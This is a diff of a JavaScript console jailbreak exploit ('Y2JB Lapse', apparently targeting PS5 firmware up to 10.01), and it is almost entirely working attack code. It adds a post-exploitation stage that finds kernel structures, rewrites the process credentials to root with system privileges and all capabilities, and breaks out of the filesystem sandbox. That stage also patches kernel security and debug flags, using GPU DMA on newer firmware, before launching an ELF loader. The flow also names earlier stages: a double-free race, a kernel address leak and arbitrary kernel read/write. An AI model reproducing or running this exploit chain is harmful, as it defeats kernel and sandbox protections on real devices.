@@ -25,7 +25,7 @@
 
 (async function() {
     try {
-        const lapse_version = "Y2JB Lapse 2.0 by Gezine";
+        const lapse_version = "Y2JB Lapse 1.1 by Gezine";
         
         let failcheck_path;
 
@@ -103,19 +103,6 @@
         const RTP_SET = 1n;
         const PRI_REALTIME = 2n;
 
-        const KERNEL_PID = 0n;
-        const ROOTVNODE_OFFSET = 0x8n;
-        const FILEDESCENT_SIZE = 0x30n;
-
-        const F_SETFL    = 4n;
-        const O_NONBLOCK = 4n;
-
-        const OFFSET_UCRED_CR_SCEAUTHID = 0x58n;
-        const OFFSET_UCRED_CR_SCECAPS = 0x60n;
-        const OFFSET_UCRED_CR_SCEATTRS = 0x83n;
-        const OFFSET_P_UCRED = 0x40n;
-        const SYSCORE_AUTHID = 0x4800000000000007n;
-        
         let block_fd = 0xffffffffffffffffn;
         let unblock_fd = 0xffffffffffffffffn;
         let block_id = -1n;
@@ -1530,116 +1517,170 @@
             }
         }
 
-        async function ps5_jailbreak() {
-                        
+        async function post_exploitation_ps5() {
+            const OFFSET_UCRED_CR_SCEAUTHID = 0x58n;
+            const OFFSET_UCRED_CR_SCECAPS = 0x60n;
+            const OFFSET_UCRED_CR_SCEATTRS = 0x83n;
+            const OFFSET_P_UCRED = 0x40n;
+
+            const KDATA_MASK = 0xffff804000000000n;
+            const SYSTEM_AUTHID = 0x4800000000010003n;
+
             function find_allproc() {
                 let proc = kernel.addr.curproc;
-                while ((proc & 0xFFFFFFFF00000000n) !== 0xFFFFFFFF00000000n) {
-                    proc = kernel.read_qword(proc + 0x8n);
-                }
-                return proc;
-            }
-            
-            function pfind(pid) {
-                let p = kernel.read_qword(allproc);
-                while (p !== 0n) {
-                    if (kernel.read_dword(p + kernel_offset.PROC_PID) === pid) {
-                        return p;
+                const max_attempt = 32;
+
+                for (let i = 1; i <= max_attempt; i++) {
+                    if ((proc & KDATA_MASK) === KDATA_MASK) {
+                        const data_base = proc - kernel_offset.DATA_BASE_ALLPROC;
+                        if ((data_base & 0xfffn) === 0n) {
+                            return proc;
+                        }
                     }
-                    p = kernel.read_qword(p);
+                    proc = kernel.read_qword(proc + 0x8n);  // proc->p_list->le_prev
                 }
-                throw new Error(`failed to find proc with pid ${pid}`);
-            }
-            
-            function get_rootvnode() {
-                const p = pfind(KERNEL_PID);
-                const p_fd = kernel.read_qword(p + kernel_offset.PROC_FD);
-                return kernel.read_qword(p_fd + ROOTVNODE_OFFSET);
+
+                throw new Error("failed to find allproc");
             }
 
-            function create_nonblock_pipe() {
-                const [read_fd, write_fd] = create_pipe();
-                syscall(SYSCALL.fcntl, read_fd,  F_SETFL, O_NONBLOCK);
-                syscall(SYSCALL.fcntl, write_fd, F_SETFL, O_NONBLOCK);
-                return [read_fd, write_fd];
-            }
+            function get_dmap_base() {
+                if (!kernel.addr.data_base) {
+                    throw new Error("kernel.addr.data_base not set");
+                }
 
-            function fget(fd) {
-                const filedescent_addr = kernel.addr.curproc_ofiles + BigInt(fd) * kernel_offset.SIZEOF_OFILES;
-                return kernel.read_qword(filedescent_addr);
-            }
-            
-            function fhold(fp) {
-                const refcount = kernel.read_dword(fp + 0x28n);
-                kernel.write_dword(fp + 0x28n, refcount + 1n);
-            }
+                const OFFSET_PM_PML4 = 0x20n;
+                const OFFSET_PM_CR3 = 0x28n;
 
-            function get_fdata(fd) {
-                return kernel.read_qword(fget(fd) + 0x0n);
+                const kernel_pmap_store = kernel.addr.data_base + kernel_offset.DATA_BASE_KERNEL_PMAP_STORE;
+
+                const pml4 = kernel.read_qword(kernel_pmap_store + OFFSET_PM_PML4);
+                const cr3 = kernel.read_qword(kernel_pmap_store + OFFSET_PM_CR3);
+                const dmap_base = pml4 - cr3;
+                
+                return { dmap_base, cr3 };
             }
             
-            kernel.addr.allproc = find_allproc();
-            const allproc = kernel.addr.allproc;
-            const p = kernel.addr.curproc;
-            const ucred = kernel.read_qword(p + OFFSET_P_UCRED); // p_ucred
-            
-            kernel.write_dword(ucred + 0x04n, 0n); // cr_uid
-            kernel.write_dword(ucred + 0x08n, 0n); // cr_ruid
-            kernel.write_dword(ucred + 0x0Cn, 0n); // cr_svuid
-            kernel.write_dword(ucred + 0x10n, 1n); // cr_ngroups
-            kernel.write_dword(ucred + 0x14n, 0n); // cr_rgid
-            kernel.write_dword(ucred + 0x18n, 0n); // cr_svgid
+            function get_additional_kernel_address() {
+                kernel.addr.allproc = find_allproc();
+                kernel.addr.data_base = kernel.addr.allproc - kernel_offset.DATA_BASE_ALLPROC;
+                kernel.addr.base = kernel.addr.data_base - kernel_offset.DATA_BASE;
 
-            // escalate sony privs
-            kernel.write_qword(ucred + OFFSET_UCRED_CR_SCEAUTHID, SYSCORE_AUTHID); // cr_sceAuthID
+                const { dmap_base, cr3 } = get_dmap_base();
+                kernel.addr.dmap_base = dmap_base;
+                kernel.addr.kernel_cr3 = cr3;
+            }
 
-            // enable all app capabilities
-            kernel.write_qword(ucred + OFFSET_UCRED_CR_SCECAPS, 0xffffffffffffffffn); // cr_sceCaps[0]
-            kernel.write_qword(ucred + OFFSET_UCRED_CR_SCECAPS + 8n, 0xffffffffffffffffn); // cr_sceCaps[1]
+            function escape_filesystem_sandbox(proc) {
+                const proc_fd = kernel.read_qword(proc + kernel_offset.PROC_FD); // p_fd
+                const rootvnode = kernel.read_qword(kernel.addr.data_base + kernel_offset.DATA_BASE_ROOTVNODE);
 
-            // set app attributes
-            kernel.write_byte(ucred + OFFSET_UCRED_CR_SCEATTRS, 0x80n); // SceAttrs
- 
-            // Allow root file system access.
-            const rootvnode = get_rootvnode();        
-            const p_fd = kernel.read_qword(p + 0x48n);
+                kernel.write_qword(proc_fd + 0x10n, rootvnode); // fd_rdir
+                kernel.write_qword(proc_fd + 0x18n, rootvnode); // fd_jdir
+            }
+
+            function patch_ucred(ucred, authid) {
+                kernel.write_dword(ucred + 0x04n, 0n); // cr_uid
+                kernel.write_dword(ucred + 0x08n, 0n); // cr_ruid
+                kernel.write_dword(ucred + 0x0Cn, 0n); // cr_svuid
+                kernel.write_dword(ucred + 0x10n, 1n); // cr_ngroups
+                kernel.write_dword(ucred + 0x14n, 0n); // cr_rgid
+
+                // escalate sony privs
+                kernel.write_qword(ucred + OFFSET_UCRED_CR_SCEAUTHID, authid); // cr_sceAuthID
+
+                // enable all app capabilities
+                kernel.write_qword(ucred + OFFSET_UCRED_CR_SCECAPS, 0xffffffffffffffffn); // cr_sceCaps[0]
+                kernel.write_qword(ucred + OFFSET_UCRED_CR_SCECAPS + 8n, 0xffffffffffffffffn); // cr_sceCaps[1]
+
+                // set app attributes
+                kernel.write_byte(ucred + OFFSET_UCRED_CR_SCEATTRS, 0x80n); // SceAttrs
+            }
+
+            async function escalate_curproc() {
+                const proc = kernel.addr.curproc;
+
+                const ucred = kernel.read_qword(proc + OFFSET_P_UCRED); // p_ucred
+                const authid = SYSTEM_AUTHID;
+
+                const uid_before = Number(syscall(SYSCALL.getuid));
+                const in_sandbox_before = Number(syscall(SYSCALL.is_in_sandbox));
+
+                await log("patching curproc " + toHex(proc) + " (authid = " + toHex(authid) + ")");
+
+                patch_ucred(ucred, authid);
+                escape_filesystem_sandbox(proc);
+
+                const uid_after = Number(syscall(SYSCALL.getuid));
+                const in_sandbox_after = Number(syscall(SYSCALL.is_in_sandbox));
+
+                await log("we root now? uid: before " + uid_before + " after " + uid_after);
+                await log("we escaped now? in sandbox: before " + in_sandbox_before + " after " + in_sandbox_after);
+            }
+
+            async function apply_patches_to_kernel_data(accessor) {
+                const security_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_SECURITY_FLAGS;
+                const target_id_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_TARGET_ID;
+                const qa_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_QA_FLAGS;
+                const utoken_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_UTOKEN_FLAGS;
+
+                // Set security flags
+                await log("setting security flags");
+                const security_flags = await kernel.read_dword(security_flags_addr);
+                await log("  before: " + toHex(security_flags));
+                await accessor.write_dword(security_flags_addr, security_flags | 0x14n);
+                const security_flags_after = await kernel.read_dword(security_flags_addr);
+                await log("  after:  " + toHex(security_flags_after));
+
+                // Set targetid to DEX
+                await log("setting targetid");
+                const target_id_before = await kernel.read_byte(target_id_flags_addr);
+                await log("  before: " + toHex(target_id_before));
+                await accessor.write_byte(target_id_flags_addr, 0x82n);
+                const target_id_after = await kernel.read_byte(target_id_flags_addr);
+                await log("  after:  " + toHex(target_id_after));
+
+                // Set qa flags and utoken flags for debug menu enable
+                await log("setting qa flags and utoken flags");
+                const qa_flags = await kernel.read_dword(qa_flags_addr);
+                await log("  qa_flags before: " + toHex(qa_flags));
+                await accessor.write_dword(qa_flags_addr, qa_flags | 0x10300n);
+                const qa_flags_after = await kernel.read_dword(qa_flags_addr);
+                await log("  qa_flags after:  " + toHex(qa_flags_after));
+
+                const utoken_flags = await kernel.read_byte(utoken_flags_addr);
+                await log("  utoken_flags before: " + toHex(utoken_flags));
+                await accessor.write_byte(utoken_flags_addr, utoken_flags | 0x1n);
+                const utoken_flags_after = await kernel.read_byte(utoken_flags_addr);
+                await log("  utoken_flags after:  " + toHex(utoken_flags_after));
+
+                await log("debug menu enabled");
+            }
+
+            // Main execution
+            get_additional_kernel_address();
+
+            // patch current process creds
+            await escalate_curproc();
+
+            update_kernel_offsets();
             
-            kernel.write_qword(p_fd + 0x08n, rootvnode);  // fd_cdir
-            kernel.write_qword(p_fd + 0x10n, rootvnode);  // fd_rdir
-            kernel.write_qword(p_fd + 0x18n, 0n);         // fd_jdir
-            
-            // Allow syscall from everywhere.
-            const p_dynlib = kernel.read_qword(p + 0x3e8n);
-            kernel.write_qword(p_dynlib + 0xf0n, 0n);                    // start
-            kernel.write_qword(p_dynlib + 0xf8n, 0xFFFFFFFFFFFFFFFFn);   // end
-            
-            // Allow dlsym.
-            const dynlib_eboot = kernel.read_qword(p_dynlib + 0x00n);
-            const eboot_segments = kernel.read_qword(dynlib_eboot + 0x40n);
-            kernel.write_qword(eboot_segments + 0x08n, 0n);                   // addr
-            kernel.write_qword(eboot_segments + 0x10n, 0xFFFFFFFFFFFFFFFFn);  // size
-            
-            const master_pipe = create_nonblock_pipe();
-            const victim_pipe = create_nonblock_pipe();
-            
-            const master_rpipe_data = get_fdata(master_pipe[0]);
-            const victim_rpipe_data = get_fdata(victim_pipe[0]);
-            
-            fhold(fget(master_pipe[0]));
-            fhold(fget(master_pipe[1]));
-            fhold(fget(victim_pipe[0]));
-            fhold(fget(victim_pipe[1]));
-            
-            kernel.write_dword(master_rpipe_data + 0x00n, 0n);
-            kernel.write_dword(master_rpipe_data + 0x04n, 0n);
-            kernel.write_dword(master_rpipe_data + 0x08n, 0n);
-            kernel.write_dword(master_rpipe_data + 0x0Cn, BigInt(PAGE_SIZE));
-            kernel.write_qword(master_rpipe_data + 0x10n, victim_rpipe_data);
-            
-            await load_aioshellcode(allproc, master_pipe, victim_pipe);
-            
+            await log("initializing gpu setup");
+            // init GPU DMA for kernel r/w on protected area
+            await gpu.setup();
+
+            const force_kdata_patch_with_gpu = false;
+            const fw_version_num = Number(FW_VERSION);
+
+            if (fw_version_num >= 7 || force_kdata_patch_with_gpu) {
+                await log("applying patches to kernel data (with GPU DMA method)");
+                await apply_patches_to_kernel_data(gpu);
+            } else {
+                await log("applying patches to kernel data");
+                await apply_patches_to_kernel_data(kernel);
+            }
         }
-        
+
+
         async function cleanup() {
             await log("Performing cleanup...");
 
@@ -1689,6 +1730,8 @@
                     }
                     sds_alt = null;
                 }
+                
+                set_rtprio(prev_rtprio);
 
                 await log("Cleanup completed");
 
@@ -1697,40 +1740,63 @@
             }
         }
         
+        async function cleanup_fail() {
+            await cleanup();
+            
+            if (is_jailbroken()) {
+                write_file("/user/temp/common_temp/lapse.fail", "");
+            } else {
+                write_file(failcheck_path, "");
+            }
+            
+            await log("Exploit failed - Reboot and try again");
+            send_notification("Exploit failed - Reboot and try again");
+        }
+        
+        function rerun_check() {
+            return file_exists(failcheck_path) || file_exists("/user/temp/common_temp/lapse.fail");
+        }
+        
         ////////////////////
         // MAIN EXECUTION //
         ////////////////////
         
-        await log(lapse_version);
-        send_notification(lapse_version);
-        
-        if(typeof load_aioshellcode === "undefined") {
-            await log("Update Y2JB to at least 1.4 version");
-            send_notification("Update Y2JB to at least 1.4 version");
-            return;
-        }
-        
-        if (compare_version(FW_VERSION, "10.01") > 0) {
-            await log("Unsupported fw " + FW_VERSION);
-            send_notification("Unsupported fw " + FW_VERSION);
-            return;
-        }
-        
-        if(is_jailbroken()) {
-            await log("Already Jailbroken");
-            send_notification("Already Jailbroken");
+        try {
+            if(kill_youtube) {
+                if(is_jailbroken()) {
+                    await log("Already Jailbroken");
+                    send_notification("Already Jailbroken");
+                    return;
+                }                
+            } else {
+                throw new Error();
+            }
+        } catch (e) {
+            await log("Not supported Y2JB\nUpdate Y2JB to at least 1.2 stable");
+            send_notification("Not supported Y2JB\nUpdate Y2JB to at least 1.2 stable");
             return;
         }
         
         failcheck_path = "/" + get_nidpath() + "/common_temp/lapse.fail";
 
-        if(file_exists(failcheck_path)) {
+        if(rerun_check()) {
             await log("Restart your PS5 to run Lapse again");
             send_notification("Restart your PS5 to run Lapse again");
             return;
         }
+
+        await log(lapse_version);
+        send_notification(lapse_version);
         
-        write_file(failcheck_path, "");
+        await log("Detected firmware : " + FW_VERSION);
+        
+        if (compare_version(FW_VERSION, "10.01") > 0) {
+            await log("Not suppoerted firmware\nAborting...");
+            send_notification("Not suppoerted firmware\nAborting...");
+            return;
+        }
+        
+        kernel_offset = get_kernel_offset()
         
         await log("\n=== STAGE 0: Setup ===");
         const setup_success = await setup();
@@ -1746,9 +1812,7 @@
             const sd_pair = await double_free_reqs2();
             if (sd_pair === null) {
                 await log("Stage 1 race condition failed");
-                await cleanup();
-                await log("Exploit failed - Reboot and try again");
-                send_notification("Exploit failed - Reboot and try again");
+                await cleanup_fail();
                 return;
             }
             await log("Stage 1 completed");
@@ -1757,9 +1821,7 @@
             const leak_result = await leak_kernel_addrs(sd_pair, sds);
             if (leak_result === null) {
                 await log("Stage 2 kernel address leak failed");
-                await cleanup();
-                await log("Exploit failed - Reboot and try again");
-                send_notification("Exploit failed - Reboot and try again");
+                await cleanup_fail();
                 return;
             }
             await log("Stage 2 completed");
@@ -1788,9 +1850,7 @@
     
             if (pktopts_sds === null) {
                 await log("Stage 3 double free SceKernelAioRWRequest failed");
-                await cleanup();
-                await log("Exploit failed - Reboot and try again");
-                send_notification("Exploit failed - Reboot and try again");
+                await cleanup_fail();
                 return;
             }
             
@@ -1810,31 +1870,36 @@
             
             if (arw_result === null) {
                 await log("Stage 4 get arbitrary kernel read/write failed");
-                await cleanup();
-                await log("Exploit failed - Reboot and try again");
-                send_notification("Exploit failed - Reboot and try again");
+                await cleanup_fail();
                 return;
             }
             
             await log("Stage 4 completed!");
             
-            await log("\n=== STAGE 5: PS5 Jailbreak===");
+            await log("\n=== STAGE 5: PS5 post-exploitation ===");
             
-            await ps5_jailbreak();
-            await log("Stage 5 completed!");
+            try {
+                await post_exploitation_ps5();
+                await log("Stage 5 completed!");
+            } catch (e) {
+                await log("Stage 5 post-exploitation failed");
+                throw e;
+            }
+            
+            await elf_loader();
             
             await cleanup();
             
-            await log("Lapse finished");
-            send_notification("Lapse finished");
+            await log("Lapse finished\nClosing Y2JB...");
+            send_notification("Lapse finished\nClosing Y2JB...");
             
-            kill_youtube();
+            await kill_youtube();
             
         } catch (e) {
             await log("Lapse error: " + e.message);
             await log(e.stack);
             
-            await cleanup();
+            await cleanup_fail();
         }
         
     } catch (e) {
